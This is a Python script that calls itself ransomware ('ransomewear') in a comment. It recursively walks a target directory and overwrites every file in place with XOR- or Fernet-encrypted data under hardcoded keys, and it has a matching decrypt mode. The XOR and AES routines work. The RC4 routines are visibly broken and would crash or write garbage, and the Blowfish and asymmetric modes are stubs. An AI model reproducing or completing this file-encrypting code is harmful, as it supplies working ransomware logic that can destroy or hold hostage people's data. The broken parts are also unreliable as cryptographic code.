#!/usr/bin/env python3

#imports
import random, base64
from hashlib import sha1
from pathlib import Path
import numpy
import sys
import os
import re
import binascii
import base64
from itertools import cycle
#additional imports
from cryptography.fernet import Fernet,InvalidToken

#Step 1: 
#Scan dir presented to find all files located inside file.
xorKey = "FLS"
encoder = "latin_1"
AESkey = "oz_S22im8QEMyZxto-C_6J9HwIYOGc9rux4fh-si1So="
rc4textkey = "lv_17yvrgYdkWsjms5_oi-6_7gy="
sizeOfArray = 256
s = []
t = []


def encryptXor():
    for root, dirs, files in os.walk(sys.argv[1]):
        for file1 in files:        
            # data can be held in differnt formats which mean we have to account for them.
            data = open(os.path.join(root,file1),"rb+")
            dataValue = data.read()
            data.seek(0)
            value = bytes(list((x^ord(y)) for (x,y) in zip(dataValue,cycle(xorKey))))            
            data.write(value)
            data.truncate()
            data.close()
            
def decryptXor():
    for root, dirs, files in os.walk(sys.argv[1]):
        for file2 in files:
            data = open(os.path.join(root,file2),"rb+")
            dataValue = data.read()
            data.seek(0)
            value = bytes(list((x^ord(y)) for (x,y) in zip(dataValue,cycle(xorKey))))
            # value = ''.join(chr(ord(x)^ord(y)) for (x,y) in zip(str(dataValue), cycle(xorKey)))      
            data.write(value) #writes over the files <---- so we want to implement our ransomewear encryption here
            data.truncate()
            data.close
def encryptAES():
    for root, dirs, files in os.walk(sys.argv[1]):
        for file1 in files:
            data = open(os.path.join(root,file1),"rb+")
            data_value = data.read()
            data.seek(0)
            fernet = Fernet(AESkey)
            data.write(fernet.encrypt(data_value))
            data.truncate()
            data.close
def decryptAES():
    for root, dirs, files in os.walk(sys.argv[1]):
        for file2 in files: 
            data = open(os.path.join(root,file2),"rb+")
            data_value = data.read()
            data.seek(0)
            fernet = Fernet(AESkey)
            data.write(fernet.decrypt(data_value))  
            data.truncate()
            data.close()


#KSA Algorithm
def KSA(key):
    i = 0
    j = 0
    for i in range(256):
        s[i] = i
        t[i] = key[i% len(key)]
    for i in range(0,256,1):
        j = (j + s[i] + t[i])%256
        temp = s[i]
        s[i] = s[j]
        s[j] = temp.bytes

def PRGA(inputlength):
    i,j,k,l = 0
    key = []
    for k in range(sizeOfArray):
        i = (i + 1) % sizeOfArray
        j = (j + s[i]) % sizeOfArray
        temp = s[i]
        s[i] = s[j]
        s[j] = temp
        l = (s[i]+s[j])
        key[k] = s[l]
    return key

def text_to_bytes():
    for root, dirs, files in os.walk(sys.argv[1]):
        for file1 in files: 
            byteList = []

            f = open(file1, 'r')
            s = f.read()
            f.close()

            # on Windows, default coding for Chinese is GBK
            # s = s.decode('gbk').encode('utf-8')
            for byte in s:
                byteList.append(ord(byte))
    return byteList
#set key array

def prep_key_array(s):
    return [ord(c) for c in s]


#implement RC4 algorith using the given data and key
#This would also require an XOR operation on every byte

def crypt(data, key):
    x = 0
    box = list(range(256))
    #box = len(allocations)
    for i in box:
        x = (x + box[i] + ord(key[i % len(key)])) % 256
        box[i], box[x] = box[x], box[i]
    x = y = 0
    out = []
    for char in data:
        x = (x + 1) % 256
        y = (y + box[x]) % 256
        box[x], box[y] = box[y], box[x]
        out.append(chr(ord(char) ^ box[(box[x] + box[y]) % 256]))
    return ''.join(out)
   
def encrypt( key):
    for root, dirs, files in os.walk(sys.argv[1]):
        for file1 in files:
            KSA(key)
            text = [file1.text_to_bytes]
            k = PRGA(len(text))
            answer = []
            a,b = 0
            for i in range(len(text)):
                a = text[i].bytes
                b = k[i] ** a
                answer[i] = b.bytes
    return answer
def decrypt(key):
    for root, dirs, files in os.walk(sys.argv[1]):
        for file2 in files:
            KSA(key)
            text = [file2.text_to_bytes]
            k = PRGA(len(text))
            answer = []
            a,b = 0
            for i in range(len(text)):
                a = text[i].bytes
                b = k[i] ** a
                answer[i] = b.bytes
    return answer


def encryptRC4():
    byteList = []
    keyByte = []
    keyStream = []
    cipherlist = []
    for root, dirs, files in os.walk(sys.argv[1]):
        for file1 in files:
            data = open(os.path.join(root,file1),"rb+")
            readdata = data.read()
            #print(readdata)
            # for byte in readdata:
            #     byteList.append(ord(byte))
            byteList = readdata
            
            #print(byteList)
            for byte in rc4textkey:
                keyByte.append(ord(byte))

            keyVal = len(keyByte)
            plainVal = len(byteList)
            S = []
            for i in range(256):
                S.append(i)
            print(S)
            j = 0 
            for i in range(256):
                j = (j+S[i] + keyByte[i%keyVal])%256
                print(S[i])
                print(S[j])
                holder = S[i]
                S[i] = S[j]
                S[j] = holder

               # S[i], S[j] = S[j], S[i]
                
            i = 0
            j = 0
            for m in range(plainVal):
                j = ((j + S[i]) % 256)
                i = ((i + 1) % 256)
	            #S[i],S[j] = S[j],S[i]
	            #k = S[(S[i] + S[j]) % 256]
                #keyStream.append(k)
                #cipherlist.append(k^byteList[m])


            



            #data_value = data.read()
            data.seek(0)
            data.write(encrypt(rc4textkey))
            data.truncate()
            data.close


def decryptRC4():
    for root, dirs, files in os.walk(sys.argv[1]):
        for file2 in files: 
            data = open(os.path.join(root,file2),"rb+")
            #data_value = data.read()



            data.seek(0)
            data.write(decrypt(rc4textkey))  
            data.truncate()
            data.close()




#def encryptBlowfish():
            
#def decryptBlowfish():

def main():
    if len(sys.argv) <= 1 :
        print("folder expected")
    else:
        if len(sys.argv) <= 2 :
            print("put type of algorithm")
        else:
            if sys.argv[2] == "sym":
                if len(sys.argv) <= 3 :
                    print("put algorithm")
                else:
                    if sys.argv[3] == "XOR" or sys.argv[3] == "xor" or sys.argv[3] == "Xor":
                        if len(sys.argv) <= 4 :
                            print("put encrypt or decrypt")
                        else:
                            if sys.argv[4] == "encrypt":
                                encryptXor()
                                #print(holder)
                                print("DONE ENCRYPTION")
                            elif sys.argv[4] == "decrypt":
                                decryptXor()
                                print("DONE Decryption")
                                #print(holder)
                    elif sys.argv[3] == "AES" or sys.argv[3] == "aes" or sys.argv[3] == "Aes":
                        if len(sys.argv) <= 4 :
                            print("put encrypt or decrypt")
                        else:
                            if sys.argv[4] == "encrypt":
                                encryptAES()
                                #print(holder)
                                print("DONE ENCRYPTION")
                            elif sys.argv[4] == "decrypt":
                                decryptAES()
                                print("DONE Decryption")
                                #print(holder)
                    elif sys.argv[3] == "RC4" or sys.argv[3] == "rc4" or sys.argv[3] == "Rc4":
                        if len(sys.argv) <= 4 :
                            print("put encrypt or decrypt")
                        else:
                            if sys.argv[4] == "encrypt":
                                #data = ""
                                #rc4key = "lv_17yvrgYdkWsjms5_oi-6_7gy="
                                encryptRC4()
                    	         
                                #print(holder)
                                print("DONE ENCRYPTION")
                            elif sys.argv[4] == "decrypt":
                                decryptRC4()
                                print("DONE Decryption")
                                #print(holder)
                    elif sys.argv[3] == "BLOWFISH" or sys.argv[3] == "blowfish" or sys.argv[3] == "Blowfish":
                        if len(sys.argv) <= 4 :
                            print("put encrypt or decrypt")
                        else:
                            if sys.argv[4] == "encrypt":
                                #encryptBlowfish()
                                #print(holder)
                                print("DONE ENCRYPTION")
                            elif sys.argv[4] == "decrypt":
                                #decryptBlowfish()
                                print("DONE Decryption")
                                #print(holder)
            elif sys.argv[2] == "asym":
                print ("still need to add stuff")


if __name__ == "__main__":
    # execute only if run as a script
    main()